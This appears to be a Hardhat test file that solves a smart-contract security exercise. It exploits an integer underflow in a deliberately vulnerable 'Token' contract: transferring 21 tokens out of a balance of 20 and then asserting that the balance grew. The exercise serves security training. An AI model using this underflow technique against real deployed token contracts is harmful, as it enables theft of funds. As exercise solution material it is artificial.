const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Token";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy(20);

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })


        //Token - There is no check if balanceOf is enough.
        it("conduct your attack here", async function () {
            //await victimContract.connect(owner).transfer(attackerWallet.address, ethers.constants.MaxUint256.sub(20));
            await victimContract.connect(owner).transfer(attackerWallet.address, 21); //maxuint
            console.log(await victimContract.balanceOf(owner.address));
        });

        after(async function () {
            expect(await victimContract.balanceOf(owner.address)).to.be.above(20);
        });
    });
});